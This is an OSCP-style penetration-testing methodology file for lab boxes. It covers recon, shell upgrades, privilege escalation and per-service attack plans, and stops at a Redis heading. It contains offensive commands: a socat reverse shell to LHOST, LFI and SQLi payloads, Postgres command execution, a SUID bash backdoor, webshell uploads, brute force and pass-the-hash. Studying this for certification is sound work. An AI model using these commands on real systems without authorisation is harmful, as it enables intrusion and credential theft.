meta.title: OSCP Methods & Methodology
meta.note: The logic behind each step — understand the why, not just the command. Add your own entries to data/methods.json (see README).

methods.title: Who and where am I? (orient on a new shell)
methods.brief: Identify the shell, user, host and rights before doing anything
methods.body:
## The question
Before anything else on a fresh shell, orient yourself: *what shell is this, who am I,
where am I, and what am I allowed to do?* Every later decision — which privilege-escalation
path to try, whether to upgrade the shell first — depends on these four answers.

## What shell am I in?
    echo "$0"        # the name this shell was invoked as: -bash, /bin/sh, zsh ...
    echo "$SHELL"    # the account's default login shell from /etc/passwd (not always the one running now)
    ps -p $$         # the real process behind this shell  ($$ = current shell's PID)

`$0` is the first of the shell's *special parameters* — read-only values the shell maintains:

| Parameter | Meaning |
| --- | --- |
| $0 | Script or shell invocation name |
| $1, $2 ... | First, second, and subsequent arguments |
| $# | Number of arguments |
| $@ | All arguments, individually preserved when quoted |
| $* | All arguments, generally combined when quoted |
| $? | Exit status of the last command (0 = success) |
| $$ | Process ID of the current shell |
| $! | Process ID of the most recent background job |

Why it matters: a reverse shell often drops you into `/bin/sh` even when the account's login
shell is bash. `$0` tells you whether you have job control, history and tab-completion — i.e.
whether you should upgrade the shell (see: oscp methods show shell-tty) before working.

## Who am I, and what can I do?
    id               # uid/gid + groups — membership of sudo, docker, lxd, adm, disk is a privesc lead
    whoami
    hostname
    pwd
    sudo -l          # commands you may run as another user (often root) — the very first privesc check

## The mindset
A shell is not the goal; *context* is. Answer the four — shell, user, host, rights — and the
next step usually chooses itself.

methods.title: Stop retyping the IP — set TARGET / LHOST
methods.brief: Store the target and your IP in shell variables and reuse them
methods.body:
## The problem
During a box you type the target IP dozens of times. Retyping invites typos and slows you
down. Store it once and reference it everywhere.

## Set it
    export TARGET=10.10.10.10     # the box
    export LHOST=10.10.14.5       # YOUR attacking IP (usually tun0)
    export LPORT=4444

Use it:
    nmap -p- --min-rate 1000 "$TARGET" -oN nmap/all.txt
    curl -s "http://$TARGET/"

## Why `export`?
`TARGET=10.10.10.10` on its own lives only in the current shell. `export` marks it as an
*environment* variable, so programs you launch (nmap, curl, ffuf) inherit it. Confirm with
`env | grep TARGET`. A non-exported variable still works for *your* typing, but a child
process started from a script won't see it.

## Name the host
Some web apps only answer to a hostname (virtual hosts). Add it once:
    echo "$TARGET  box.htb" | sudo tee -a /etc/hosts

## Grab your VPN IP automatically
    export LHOST=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

methods.title: Enumerate, don't guess
methods.brief: The discover -> enumerate -> identify -> exploit loop, and why scans 'find nothing'
methods.body:
## Principle
Most OSCP/HTB boxes fall to *thorough enumeration*, not clever exploits. The loop never
changes: **discover -> enumerate each service deeply -> identify a version/misconfig -> match it to a technique -> exploit -> repeat.**

## The layers
1. Hosts & ports — full sweep first, then targeted:
       nmap -p- --min-rate 1000 "$TARGET" -oN nmap/all.txt
       nmap -sCV -p <open-ports> "$TARGET" -oN nmap/services.txt
2. Per service, go deep — web: dirs, vhosts, tech, source, default creds; SMB: shares, null
   session; etc. Use `oscp show <topic>` for the exact commands.
3. Note everything — usernames, versions, paths, emails, odd ports. Today's useless detail is
   tomorrow's password.

## "The scan found nothing"
It didn't — you missed a layer. Common misses: UDP services, a virtual host, a service on a
high port, an *authenticated* view you can now reach, a default/guessable credential. Re-run
enumeration with the new context you just gained.

## Meta-rule
If you're stuck for 20 minutes, you're missing enumeration, not an exploit. Drop back one
layer and look again (see: oscp methods show stuck-checklist).

methods.title: Upgrade a dumb shell to a real TTY
methods.brief: Get job control, history and arrow keys; why each step is needed
methods.body:
## Why
A raw reverse shell has no job control, no tab-completion, no arrow keys, and Ctrl-C kills the
whole session. Upgrade it before real work — and *before* `su`/`sudo`, which demand a TTY.

## The standard dance
    python3 -c 'import pty; pty.spawn("/bin/bash")'   # fallbacks: python / script -qc /bin/bash /dev/null
    # press Ctrl-Z to background it
    stty raw -echo; fg                                 # run this on YOUR box
    export TERM=xterm; export SHELL=/bin/bash          # back inside the target shell
    stty rows 50 cols 200                              # match your window (run `stty size` locally to get values)

## Why each step
- `pty.spawn` gives the process a *pseudo-terminal*, so tools that insist on a TTY work.
- `stty raw -echo` on your side stops the double-echo and lets keystrokes pass through raw.
- `fg` brings the shell back; setting `TERM` makes `clear`, `less` and editors render.

## No python on the target?
Try `script -qc /bin/bash /dev/null`, or a `socat` TTY if you can transfer it:
    # attacker:  socat file:`tty`,raw,echo=0 tcp-listen:4444
    # target:    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:4444

methods.title: GTFOBins: why a boring binary becomes root
methods.brief: The pattern behind SUID/sudo/capability abuse — reason, don't memorise
methods.body:
## The core idea
Privilege escalation via GTFOBins isn't magic — it's **inherited privilege + a feature**. If a
program runs with privileges you don't have, *and* that program can be made to run arbitrary
commands or read/write files, then its privilege becomes yours.

## The three ways a binary carries privilege
- **sudo** — `sudo -l` lists a binary you may run as root; it runs as root.
- **SUID bit** — `find / -perm -4000 -type f 2>/dev/null`; the binary runs as its *owner*
  (often root), regardless of who starts it.
- **capabilities** — `getcap -r / 2>/dev/null`; a fine-grained slice of root (e.g. `cap_setuid`).

## The feature you abuse
Many legitimate tools can spawn a shell, run a command, or read/write a file: `vim`, `find`,
`tar`, `awk`, `less`, `nmap` (old), `env`, `python`. Combine "runs as root" with "can spawn a
shell" and you have a root shell.

## Worked example: vim
`vim` can run shell commands (`:!sh`) and execute `:py`/`:lua`. So:
- `sudo vim` -> inside vim type `:!/bin/sh` -> root shell.
- `vim` is SUID -> a `:py` one-liner that calls `os.execl("/bin/sh", ...)` with `-p`.
Fetch the exact, tested payload locally instead of memorising it:
    oscp gtfo vim sudo

## Takeaway
Recognise the pattern — *which binary carries privilege, and what can that binary be made to
do?* — then pull the payload with `oscp gtfo <binary>`.

methods.title: When you don't know the next step
methods.brief: A staged checklist so you never run out of ideas
methods.body:
## No foothold yet?
- All 65535 TCP ports scanned? UDP top 100?
- Every web app: directories (feroxbuster/gobuster), vhosts (ffuf Host header), page source and
  comments, robots.txt/sitemap.xml, default creds, and the *exact version*'s known CVEs.
- Every service version -> `searchsploit <product> <version>` and `oscp gtfo` / `oscp notes`.
- Any credential you already found — reuse it *everywhere* (password reuse is rampant).

## Have a shell, need root?
- `sudo -l`; SUID `find / -perm -4000 -type f 2>/dev/null`; caps `getcap -r / 2>/dev/null`.
- Cron: `/etc/crontab`, `/etc/cron.*`, and `pspy` to watch jobs run.
- `id` groups: `docker`, `lxd`, `disk`, `adm`, `video` — each is its own path.
- Writable files/dirs owned by root, PATH hijacks, world-writable scripts run by root.
- Run `linpeas` — but *read* the output, don't just scroll past it.

## Have creds, stuck?
- Spray across SMB/SSH/web/AD; try as other users; try values as both usernames AND passwords.

## Meta-rule
Stuck for 20 minutes? You're missing enumeration, not an exploit. Go back one layer and look
again — note what's new since last time and re-enumerate with it.

methods.title: $PATH — how the shell finds a command (and the hijack)
methods.brief: The first-hit rule, updating PATH safely, and why hijacking works
methods.body:
## What $PATH actually is
`$PATH` is just a colon-separated list of directories. When you type a bare command name,
the shell walks this list left-to-right and runs the **first** matching executable it finds.
That single rule is the whole mechanism — there is no hidden registry of commands.

    echo "$PATH"                 # the list
    which nmap; type -a nmap     # which directory won; type -a shows ALL matches, in order

## The mental model
*"Bare name -> first hit in $PATH."* Two things fall straight out of that:
- **Order matters** — a directory earlier in $PATH shadows the same-named binary later.
- **Only listed dirs are searched** — a binary in /opt/tool needs a full path, a symlink
  into a $PATH dir, or $PATH extended to include it.

## Updating it safely
Append, never overwrite — keep the existing value:

    export PATH="$PATH:/opt/tool/bin"     # add to the END  (system dirs still win — safe)
    export PATH="/opt/tool/bin:$PATH"     # add to the FRONT (your copy wins — use on purpose)

Never write `export PATH=/opt/tool/bin` on its own — that discards every system directory and
breaks the shell. Make it permanent in ~/.bashrc or ~/.zshrc, not by blindly editing /etc.

## Why attackers love it
If a privileged program (a root cron job, a SUID binary) calls another command by *bare
name*, that name is resolved through a $PATH you may control. Put your own `curl` (or
whatever it calls) earlier in that PATH and the privileged process runs **your** code — this
is *PATH hijacking*, a direct corollary of the first-hit rule. Defenders counter it by always
calling absolute paths (/usr/bin/curl) inside privileged scripts.

methods.title: Why a user gets a particular shell (and is it controllable?)
methods.brief: /etc/passwd shell field, chsh, and the nologin lock
methods.body:
## Where a user's shell comes from
Every account line in /etc/passwd ends with its login shell:

    name:x:uid:gid:comment:/home/name:/bin/bash
                                       ^ login shell

When you log in interactively, the system runs exactly that program. So *"why does this user
get bash and that one sh?"* is answered by the last field of their passwd line.

    grep '^bob:' /etc/passwd     # see bob's shell
    cat /etc/shells              # shells the system treats as valid login shells

## Is it controllable? Yes — by whoever has the rights
    chsh -s /bin/zsh                         # change YOUR login shell
    sudo chsh -s /bin/bash bob               # change someone else's (needs privilege)
    sudo usermod -s /usr/sbin/nologin svc    # deny interactive login

## The nologin / false special case
Service accounts are usually given `/usr/sbin/nologin` or `/bin/false`. That is a deliberate
lock: the account can own files and run a service, but can't get an interactive shell. During
privesc this tells you which accounts are *reachable*. And if you can write /etc/passwd or run
`usermod`, flipping a service account's shell is itself an escalation.

## The pattern
A shell is simply *"the program login runs for you."* Who decides it? Whoever can edit
/etc/passwd or run chsh/usermod — i.e. root. So control of the shell field == control of who
can log in, and as what.

methods.title: sudoers — delegating privilege to users and groups
methods.brief: How a sudo rule is written, and how to read sudo -l as an attacker
methods.body:
## The question sudo answers
sudo lets a user run specific commands *as another user* (default root). The policy lives in
/etc/sudoers (edit with **visudo**) and /etc/sudoers.d/*. Reading that policy is exactly why
`sudo -l` is your first privilege-escalation check.

## How a rule is written
    who       where = (as-whom)   what
    bob       ALL   = (root)      /usr/bin/systemctl, /usr/bin/less
    %wheel    ALL   = (ALL:ALL)   ALL          # %name = a GROUP: every member inherits it
    svc       ALL   = (root)      NOPASSWD: /opt/backup.sh

Read it as a sentence: *"bob, on any host, may run systemctl and less as root."* To **grant**
cleanly, prefer a `%group` and the narrowest command list — add the user to the group instead
of writing a new rule each time.

## Reading it as an attacker
`sudo -l` prints precisely what you may run as root. Each allowed binary is a candidate —
can it spawn a shell, read a file, or write a file?

    sudo -l
    oscp gtfo <that-binary> sudo     # fetch the exact escape, if one exists

`NOPASSWD` entries need no password; a wildcard argument or a script you can edit is even
better (you control what root executes).

## The pattern
Privilege delegation = **subject** (user or %group) + **target identity** + **allowed
command**. To grant: narrow subject and command. To attack: every entry is *"a program run as
root whose invocation you control"* — ask what that program can be made to do.

methods.title: Permissions & chmod — the 3x3 grid and the +s bit
methods.brief: Symbolic (+/-/=), octal, and the SUID bit, from one mental model
methods.body:
## The grid behind every permission
Every file has three permission sets — **u**ser (owner), **g**roup, **o**thers — and each set
has three bits: **r**ead, **w**rite, e**x**ecute. That's all it is: a 3x3 grid. `ls -l` prints
it as `-rwxr-x---` = owner rwx, group r-x, others nothing.

    u (owner)    g (group)    o (others)
    r w x        r w x        r w x

## chmod = turn those bits on or off
Symbolic chmod reads like a sentence: *who*, *operator*, *which bits*.
- who: `u` `g` `o`  (or `a` = all)
- operator: `+` add  ·  `-` remove  ·  `=` set exactly (clears the rest of that set)
- bits: `r` `w` `x`  (plus the specials below)

    chmod +x script.sh         # add execute for everyone
    chmod u=rw,g+x,o-x file    # owner EXACTLY rw; add x to group; remove x from others
    chmod u=wr test.txt        # owner exactly write+read; group/others left untouched

`=` is the one that *clears* — `u=rw` means the owner has rw and nothing else. `+`/`-` only
nudge the bits you name.

## Octal is the same grid as numbers
r=4, w=2, x=1; add them per set. `chmod 750 file` = owner 7 (rwx), group 5 (r-x), others 0.
Use symbolic when you tweak one bit, octal when you set the whole thing.

## The special bit: +s (SUID/SGID) — why privesc cares
`chmod u+s file` sets **setuid**: the program then runs as its *owner*, not as the caller.
`g+s` is setgid (runs as the owning group). This is the engine behind much of Linux privesc —
a root-owned SUID binary that can run commands hands you root.

    find / -perm -4000 -type f 2>/dev/null     # hunt SUID-root binaries
    # (as root) chmod u+s /bin/bash  =>  later  bash -p  gives a root shell

`-s` removes it. The third special, the **sticky** bit (`+t`, e.g. on /tmp), means that in a
world-writable directory only a file's owner may delete it.

## The pattern
Permissions are just *"which of the 3x3 bits are on, plus three special bits,"* and chmod only
ever flips those. Hold the grid in your head and every chmod — symbolic or octal — reads
itself.

methods.title: The whole machine — start to finish
methods.brief: The end-to-end pipeline, with the oscp command to reach for at each stage
methods.body:
## The loop that never changes
**recon -> service -> foothold -> stabilise -> enumerate -> escalate -> loot & proof -> report.**
Every box is this loop; only the details change. Below is the map, and the exact `oscp` command to
pull the right cheat-sheet at each step.

## Quick command map (copy-paste)
For just the commands to run at each phase, use **`oscp howto`** — or `oscp howto <phase>` to
zoom in (recon · service · foothold · stabilise · enumerate · escalate · proof · report). This entry
is the narrative behind that map; `oscp howto` is the map.

## 0. Set up once
    oscp methods show target-variable      # set TARGET / LHOST so you stop retyping
    export TARGET=10.10.10.10 ; export LHOST=10.10.14.5

## 1. Recon (every port, then go deep)
    oscp methods show recon-walkthrough    # the exact nmap passes + what to do with results
    oscp atlas nmap | oscp atlas autorecon # tool references
Map each open port to a service plan (step 2).

## 2. Attack the service (branch by what's open)
    oscp methods show attack-http          # 80/443  (then wordpress/php/react sub-plans)
    oscp methods show attack-ftp           # 21
    oscp methods show attack-ssh           # 22
    oscp methods show attack-smb           # 139/445
    oscp methods show attack-rdp-winrm     # 3389 / 5985
    oscp methods show attack-databases     # 3306/1433/5432/6379/27017
    oscp show web   ·   oscp show services ·   oscp show smb    # quick cheat-sheet categories

## 3. Foothold (turn the bug into a shell)
    oscp methods show foothold-logic
    oscp hacktools revshell $LHOST 4444    # pick a reverse shell
    oscp hacktools listener 4444           # catch it

## 4. Stabilise the shell
    oscp methods show shell-tty            # upgrade to a real TTY (job control, history)

## 5. Local enumeration (as the new user)
    oscp methods show post-foothold-enum   # first 10 minutes: context + linpeas + creds
    oscp manual show linux-enum-checklist  # or windows-privesc-checklist

## 6. Privilege escalation -> root/SYSTEM
    oscp methods show privesc-linux-path   # decision tree: each finding -> a technique
    oscp methods show privesc-windows-path

## 7. Proof & loot
    oscp methods show flags-and-proof      # local.txt / proof.txt, screenshots, submission

## 8. Report
    oscp methods show report-writing       # reproducible write-up per machine

## The meta-rule
Stuck for 20 minutes at any stage? You're missing enumeration, not an exploit — drop back one layer
(`oscp methods show stuck-checklist`). (See: enumeration-mindset.)

methods.title: Recon in practice — the exact commands
methods.brief: The nmap passes to run, then how to turn each open port into an attack plan
methods.body:
## 1. Full TCP sweep, then targeted
    export TARGET=10.10.10.10
    nmap -p- --min-rate 1000 -T4 "$TARGET" -oN nmap/all.txt      # every port, fast
    ports=$(grep -oP '^\d+(?=/tcp open)' nmap/all.txt | paste -sd, -)
    nmap -sCV -p "$ports" "$TARGET" -oN nmap/services.txt        # versions + default scripts
(Short on time? `oscp atlas rustscan` / `oscp atlas masscan` find open ports fast, then feed nmap.)

## 2. Don't forget UDP
    sudo nmap -sU --top-ports 50 "$TARGET" -oN nmap/udp.txt      # SNMP(161), TFTP(69), DNS, etc.

## 3. Map port -> service -> plan
| Port(s) | Service | Go to |
| --- | --- | --- |
| 21 | FTP | `oscp methods show attack-ftp` |
| 22 | SSH | `oscp methods show attack-ssh` |
| 25/110/143 | SMTP/POP/IMAP | `oscp manual show smtp-enum` |
| 53 | DNS | `oscp show dns` |
| 80/443/8080 | HTTP(S) | `oscp methods show attack-http` |
| 88 | Kerberos (=DC) | `oscp methods show ad-enum-without-creds`* |
| 111/2049 | RPC/NFS | `oscp manual show nfs-enumeration` |
| 135/139/445 | MSRPC/SMB | `oscp methods show attack-smb` |
| 161 (UDP) | SNMP | `oscp manual show snmp-enum` |
| 389/636 | LDAP | `oscp manual show ldap-enum` |
| 1433/3306/5432/6379 | Databases | `oscp methods show attack-databases` |
| 3389 / 5985 | RDP / WinRM | `oscp methods show attack-rdp-winrm` |
(* in `oscp manual`.)

## 4. The discipline
- **Enumerate every service before exploiting any.** Launch `autorecon "$TARGET"` to run the passes
  in parallel while you work the obvious ports.
- **Note everything**: versions, usernames, emails, odd ports, paths. Today's useless detail is
  tomorrow's password.
- A version string -> `searchsploit <product version>` (`oscp atlas searchsploit`).

## Pattern
"Full TCP -> targeted -sCV -> UDP top-ports -> map each port to its plan -> enumerate all before
exploiting." (See: enumeration-mindset, stuck-checklist.)

methods.title: Port 80/443 — the web attack plan
methods.brief: Fingerprint, map, then branch by the technology you find
methods.body:
## 1. Fingerprint the stack
    whatweb -a3 http://$TARGET ; curl -sI http://$TARGET        # server, CMS, headers
    oscp atlas whatweb   ·   oscp atlas httpx                   # tool refs
Look at: Server (Apache/nginx/IIS), X-Powered-By (PHP/ASP.NET), Set-Cookie (PHPSESSID, JSESSIONID,
laravel_session...), and the page's HTML/JS. **View source** and read the comments.

## 2. Content & vhost discovery
    feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html
    ffuf -u http://$TARGET/FUZZ -w <wordlist> -e .php,.txt,.bak  # files/dirs
    ffuf -u http://$TARGET -H "Host: FUZZ.$TARGET" -w <vhosts> -fs <size>   # virtual hosts
    nikto -h http://$TARGET                                     # quick known-issue sweep
(`oscp atlas feroxbuster` / `ffuf` / `gobuster` / `dirsearch`.) Add found vhosts to /etc/hosts.

## 3. Branch by technology
| You see | Go to |
| --- | --- |
| WordPress (wp-content, wp-login) | `oscp methods show attack-wordpress` |
| PHP app / Apache | `oscp methods show attack-php-apache` |
| React/Angular/Vue SPA, lots of JS, an API | `oscp methods show attack-spa-react` |
| Tomcat (8080, /manager) | `oscp manual show tomcat-exploitation` |
| Jenkins | `oscp manual show jenkins-exploitation` |
| A generic CMS (Joomla/Drupal) | `oscp manual show cms-exploitation` |
| A login form | `oscp manual show web-auth-bypass` |
| A ?param=value | test it (step 4) |

## 4. Test every input (the bug classes)
    oscp manual show web-methodology       # the source->sink mindset
    oscp manual show sqli-logic            # ' and 1=1 -- -   (-> oscp atlas sqlmap)
    oscp manual show lfi-rfi-logic         # ?page=../../../../etc/passwd
    oscp manual show file-upload-bypass    # upload a webshell
    oscp manual show command-injection-logic ; ssti-logic ; xss-logic ; ssrf-logic
    oscp show web                          # web cheat-sheet category

## 5. Default & guessable creds
Try admin/admin, product defaults, and creds you found elsewhere on the box. Then brute a form with
hydra if in scope (`oscp atlas hydra`).

## Pattern
"Fingerprint -> fuzz dirs/vhosts -> branch by tech -> test every input source-to-sink -> creds."
The webroot/version you find here also enables SQLi->RCE webshells later (`oscp manual show sqli-to-rce`).

methods.title: WordPress — the attack plan
methods.brief: wpscan enumeration to users, plugins and a theme-editor shell
methods.body:
## 1. Enumerate with wpscan
    wpscan --url http://$TARGET -e vp,vt,u --api-token <token>  # vuln plugins/themes + users
    wpscan --url http://$TARGET -e ap,at,u                      # all plugins/themes if no token
    oscp atlas wpscan
Record: **WP core version**, **plugins + versions** (the usual way in), and **usernames** (`-e u`,
or author= enum, or /wp-json/wp/v2/users).

## 2. Turn findings into access
- **Vulnerable plugin/theme** -> `searchsploit <plugin>` -> often LFI/SQLi/upload/RCE. Most WP boxes
  fall to a plugin, not core.
- **Weak admin password** -> brute **xmlrpc** (fast) or wp-login:
      wpscan --url http://$TARGET -U admin -P /usr/share/wordlists/rockyou.txt
- **xmlrpc.php** enabled -> amplifies brute force (system.multicall).

## 3. Admin -> shell
Once you have wp-admin:
- **Appearance -> Theme Editor** -> edit 404.php/header.php of an inactive theme to a PHP webshell
  (`oscp hacktools php`), then browse it.
- Or **upload a malicious plugin** (zip with PHP code) -> activate -> browse.
- Then: `oscp hacktools revshell $LHOST 4444` + `oscp hacktools listener 4444`.

## 4. Loot
    cat wp-config.php        # DB creds -> reuse for SSH/DB/other users (password reuse is everywhere)
Found DB creds? -> `oscp methods show attack-databases`.

## Pattern
"wpscan (-e vp,vt,u) -> vuln plugin OR weak creds -> theme editor / plugin upload -> php webshell ->
reverse shell -> loot wp-config." (See: attack-php-apache, foothold-logic.)

methods.title: PHP apps & Apache — the attack plan
methods.brief: LFI, uploads, log poisoning and Apache-specific quirks
methods.body:
## PHP application bugs (the common wins)
    oscp manual show lfi-rfi-logic
- **LFI**: `?page=../../../../etc/passwd` and `php://filter/convert.base64-encode/resource=config.php`
  to read source. Escalate LFI -> RCE via **log poisoning** (`oscp manual show log-poisoning`),
  `/proc/self/environ`, PHP sessions, or `data://`/`php://input` wrappers.
- **File upload**: bypass filters (ext case, double ext, magic bytes, .phtml/.php5) and drop a
  webshell -> `oscp manual show file-upload-bypass` + `oscp hacktools php`.
- **SQLi -> RCE**: `INTO OUTFILE` a webshell if FILE priv + webroot known -> `oscp manual show sqli-to-rce`.
- **Type juggling / deserialization**: `oscp manual show php-type-juggling` · `php-deserialization-phar`.

## Get the source when you can
LFI via `php://filter`, exposed `.git` (`oscp atlas git-dumper`), backups (`.php.bak`, `~`, `.swp`),
or `/.phps`. Then review it: `oscp manual show web-source-review`.

## Apache-specific quirks
- **.htaccess / config leaks**: readable `/server-status`, `/.htpasswd`, `/config.php.bak`.
- **mod_cgi + Shellshock** (old `/cgi-bin/*.sh`): `oscp manual show shellshock` — a tell is a
  cgi-bin script + an old bash.
- **Alias/userdir**: `/~user/` reveals local usernames.
- **PUT enabled / WebDAV**: `oscp manual show webdav-exploitation` (`oscp atlas davtest` / `cadaver`).

## Then: webshell -> reverse shell
    oscp hacktools php            # the webshell one-liners
    oscp hacktools revshell $LHOST 4444 ; oscp hacktools listener 4444

## Pattern
"Read source (LFI/.git/backups) -> find the sink (LFI->RCE, upload, SQLi->OUTFILE, Shellshock) ->
webshell -> reverse shell." (See: web-methodology, sqli-to-rce, log-poisoning.)

methods.title: React / SPA & APIs — the attack plan
methods.brief: Why a JavaScript front end moves the attack surface to the API and JS files
methods.body:
## The mindset shift
A React/Angular/Vue app is mostly **static JS calling an API**. The HTML is nearly empty, so
directory brute force finds little — **the attack surface is the API and the JS bundles**, not pages.

## 1. Mine the JavaScript
    # grab every JS file, then read it:
    gau $TARGET | grep '\.js$' ; katana -u http://$TARGET -jc     # oscp atlas gau / katana
JS bundles leak **API base URLs, endpoints, parameter names, role flags, hidden admin routes, and
sometimes keys/tokens**. Search for: `fetch(`, `axios`, `/api/`, `apiKey`, `token`, `admin`, `http`.
Source maps (`.js.map`) rebuild the original source — grab them.

## 2. Enumerate the API directly
    # the API is the real target; hit it without the UI:
    ffuf -u http://$TARGET/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
    oscp manual show api-and-graphql         # REST + GraphQL method
    oscp atlas arjun                         # discover hidden parameters
- **GraphQL** (`/graphql`)? -> `oscp methods show attack-http` branch + `oscp manual show graphql-enumeration`
  (`oscp atlas clairvoyance` / `graphw00f`).

## 3. Test the API's bug classes
- **IDOR / broken authz**: change ids, call privileged endpoints directly (the UI hides them, the API
  doesn't) -> `oscp manual show idor-access-control`.
- **Auth**: JWT weaknesses -> `oscp manual show jwt-attacks-advanced` (`oscp atlas jwt_tool`).
- **Injection** in JSON bodies: SQLi/NoSQLi/SSTI/command injection just like any param.
- **Mass assignment**: add `"role":"admin"` to a JSON body the client never sends.

## Pattern
"Read the JS bundles for endpoints/keys -> attack the API directly (not the UI) -> IDOR + auth +
injection + mass-assignment." The front end is a map, not the target. (See: api-and-graphql,
idor-access-control, jwt-attacks-advanced.)

methods.title: Port 21 (FTP) — the attack plan
methods.brief: Anonymous access, version exploits, and using FTP to reach other services
methods.body:
## 1. Banner + anonymous
    nmap -p21 -sCV --script ftp-anon,ftp-syst "$TARGET"
    ftp $TARGET        # try user: anonymous  pass: anything
    # inside: binary ; ls -la ; mget *      (get everything)
    oscp atlas ftp
Anonymous FTP often holds configs, backups, source, or user files -> creds / password reuse.

## 2. Version -> exploit
    searchsploit <ftp software and version>     # e.g. vsftpd 2.3.4 (backdoor), ProFTPD mod_copy
`oscp atlas searchsploit`. Note the exact banner from `-sCV`.

## 3. FTP as a lever
- **Writable FTP mapped to a webroot** = upload a webshell and browse it (the classic FTP+HTTP combo).
  Check if the HTTP server serves what you can write via FTP.
- **mod_copy (ProFTPD)**: `SITE CPFR`/`CPTO` to copy files into the webroot even without a login.
- **Credentials found elsewhere** -> try them here (and vice-versa).

## 4. Brute (if in scope)
    hydra -L users.txt -P rockyou.txt ftp://$TARGET -f        # oscp atlas hydra

## Pattern
"Anonymous? grab everything. Version? searchsploit. Writable + webroot? upload a shell. Creds? reuse."
(See: attack-http, foothold-logic, creds-hunting in `oscp manual`.)

methods.title: Port 22 (SSH) — the attack plan
methods.brief: User enumeration, key reuse, and when brute force is worth it
methods.body:
## 1. Banner + audit
    nmap -p22 -sCV "$TARGET" ; ssh-audit $TARGET        # oscp atlas ssh-audit
The version maps the OS/distro; very old OpenSSH has user-enum CVEs. SSH itself is rarely the *bug* —
it's where **found credentials or keys** pay off.

## 2. Credentials & keys (the real path)
- **Creds found elsewhere** (web, FTP, configs, DB) -> `ssh user@$TARGET`. Password reuse is the
  number-one SSH win.
- **A private key you looted** (id_rsa in a readable home/backup/web):
      chmod 600 id_rsa ; ssh -i id_rsa user@$TARGET
  Encrypted key? `ssh2john id_rsa > h ; john --wordlist=rockyou.txt h` (`oscp atlas john`).
- **authorized_keys writable** (via another bug) -> drop your public key.

## 3. Brute force (only when hinted, and in scope)
    hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t4 -f    # oscp atlas hydra
Use a **known username** and a targeted list; blind SSH brute is slow and noisy. Build a user list
from the web app / enumeration first.

## 4. After you're in
    oscp methods show shell-tty             # you likely already have a TTY; confirm context
    oscp methods show post-foothold-enum

## Pattern
"SSH = the payoff for loot. Reuse creds, use/crack a stolen key, drop a key if you can write
authorized_keys; brute only with a known user." (See: ssh-keys, ssh-agent-forwarding in `oscp manual`.)

methods.title: Ports 139/445 (SMB) — the attack plan
methods.brief: Shares, null sessions, versions and the SMB-to-shell routes
methods.body:
## 1. Version (is it exploitable outright?)
    nmap -p445 --script smb-protocols,smb2-security-mode,smb-os-discovery "$TARGET"
    nxc smb $TARGET                         # banner, OS, signing, domain   (oscp atlas nxc)
Old SMBv1 / unpatched Windows -> **EternalBlue (MS17-010)**: `oscp manual show eternalblue-ms17010`
(nmap `--script smb-vuln-ms17-010` to confirm).

## 2. Shares & null session
    nxc smb $TARGET -u '' -p '' --shares            # null session shares
    smbclient -L //$TARGET/ -N ; smbmap -H $TARGET  # list + perms  (oscp atlas smbclient / smbmap)
    smbclient //$TARGET/share -N                    # connect; mget * to loot
    oscp manual show smb-enumeration-checklist
Readable shares leak configs, scripts, backups, and creds. **Writable** shares can take a payload.

## 3. With credentials
    nxc smb $TARGET -u user -p pass --shares        # what this account can read
    nxc smb $TARGET -u user -p pass --rid-brute     # usernames
    # exec (if admin):  impacket-psexec / wmiexec / smbexec user:pass@$TARGET   (oscp show ad)
    oscp show smb   ·   oscp show ad

## 4. SMB-to-shell routes
- **Admin creds/hash** -> psexec/wmiexec/smbexec = SYSTEM (`oscp atlas impacket-psexec`).
- **Writable share mapped to a web/app path** -> drop a payload.
- **Creds from a share** -> reuse on RDP/WinRM/SSH/DB.

## Pattern
"Version (MS17-010?) -> null-session shares -> loot/creds -> with creds: enumerate, rid-brute, then
psexec/wmiexec if admin." (See: attack-rdp-winrm, pass-the-hash-ticket in `oscp manual`.)

methods.title: RDP (3389) & WinRM (5985) — the attack plan
methods.brief: Using credentials or hashes to get an interactive Windows session
methods.body:
## These are *access* services — you need a credential first
RDP and WinRM rarely have a pre-auth bug on OSCP; they're how you **use** creds/hashes you already
found (web, SMB, shares, DB, kerberoast). Get a credential, then:

## RDP (3389)
    xfreerdp /u:user /p:pass /v:$TARGET /cert:ignore /dynamic-resolution +clipboard    # oscp atlas xfreerdp
    xfreerdp /u:user /pth:<NThash> /v:$TARGET /cert:ignore     # pass-the-hash (if restricted-admin)
    nmap -p3389 --script rdp-ntlm-info "$TARGET"               # leaks hostname/domain
    # drag-drop/clipboard lets you move tools in.

## WinRM (5985/5986) — the quiet favourite
    nxc winrm $TARGET -u user -p pass            # validate creds for WinRM
    evil-winrm -i $TARGET -u user -p pass        # interactive PS shell   (oscp atlas evil-winrm)
    evil-winrm -i $TARGET -u user -H <NThash>    # pass-the-hash
Being in **Remote Management Users** (or local admin) grants WinRM. evil-winrm has upload/download
and `-s` for scripts.

## After the session
    oscp manual show windows-privesc-checklist   # whoami /priv -> tokens/services/tasks/creds
    oscp methods show privesc-windows-path

## Pattern
"Find a credential/hash elsewhere -> xfreerdp (or PtH) for RDP, evil-winrm for WinRM -> then local
Windows privesc." (See: attack-smb, pass-the-hash-ticket, windows-potato-attacks in `oscp manual`.)

methods.title: Databases (MySQL/MSSQL/Postgres/Redis/Mongo)
methods.brief: Enumerating and exploiting exposed database services
methods.body:
## General approach
Connect (try default/blank/found creds) -> enumerate users & databases -> read secrets -> escalate to
file write / command execution. Creds live in web configs (wp-config.php, .env, settings.py).

## MySQL/MariaDB (3306)
    mysql -h $TARGET -u root -p                 # try blank / 'root' / found creds
    # inside: show databases; use <db>; show tables; select * from users;
    # RCE if FILE priv + webroot known -> oscp manual show sqli-to-rce  (INTO OUTFILE a webshell)

## MSSQL (1433)
    impacket-mssqlclient user:pass@$TARGET -windows-auth     # oscp atlas impacket-mssqlclient
    nxc mssql $TARGET -u user -p pass -x whoami
    oscp manual show mssql-abuse        # xp_cmdshell, impersonation, linked servers (-> SYSTEM)

## PostgreSQL (5432)
    psql -h $TARGET -U postgres          # try postgres/postgres
    # RCE as superuser:  COPY (SELECT '') TO PROGRAM 'id';   (oscp manual show sqli-to-rce)
    oscp manual show redis-exploitation  # (and see below for Redis)

## Redis (6379)
